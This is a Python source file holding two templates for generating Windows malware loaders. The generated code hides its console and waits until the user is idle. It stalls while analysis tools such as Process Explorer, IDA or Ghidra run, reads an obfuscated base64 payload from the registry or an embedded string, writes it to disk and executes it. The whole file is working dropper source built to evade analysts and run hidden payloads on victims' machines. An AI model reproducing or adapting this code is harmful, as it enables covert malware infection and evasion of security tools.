type1 = """
from shutil import copyfile
import psutil
import os
import time
import signal
from base64 import {} as {}
import winreg
from ctypes import Structure, windll, c_uint, sizeof, byref,WinDLL
{} = '{}'

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]
SW_HIDE = 0
hWnd = windll.kernel32.GetConsoleWindow()
windll.user32.ShowWindow(hWnd,SW_HIDE)
def get_idle_duration() -> float:
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0

while get_idle_duration() < 180:
        time.sleep(60)
reg_path = f"{}"
reg_key = f"{}"
debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']

while True:
       if any(debug_proc in process.name().lower() or process.name().lower() in debug_proc for debug_proc in debug_process for process in psutil.process_iter()):
          time.sleep(5)
       else:
          break
try:
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0,
                                       winreg.KEY_READ)
    value, regtype = winreg.QueryValueEx(registry_key, reg_key)
    winreg.CloseKey(registry_key)
    while get_idle_duration() < 180:
        time.sleep(60)
    with open('{}','wb') as file:
        if {} == '{}':
            file.write({}(value[::-1]))
        else:
            to_rep = [i for i in {}.split('{}')[1]]
            file.write({}(value.replace(to_rep[0],to_rep[1])))

except WindowsError:
    pass

while get_idle_duration() < 180:
        time.sleep(60)
os.system('{}')
"""


type2 = """
from base64 import {} as {}
import time
from os import system
from ctypes import Structure, windll, c_uint, sizeof, byref,WinDLL

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

def get_idle_duration() -> float:
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0

SW_HIDE = 0
hWnd = windll.kernel32.GetConsoleWindow()
windll.user32.ShowWindow(hWnd,SW_HIDE)

while get_idle_duration() < 180:
        time.sleep(60)

{} = '{}'
our_code = {}
if {} == '{}':
    our_code = our_code[::-1]
else:
    to_rep = [i for i in {}.split('{}')[1]]
    our_code = our_code.replace(to_rep[0],to_rep[1])

def {}():
    with open({},'wb') as {}:
        {}.write({}(our_code))
    with open({},'wb') as {}:
        {}.write({}(our_code))
    system({})
while get_idle_duration() < 180:
        time.sleep(60)
{}()
    """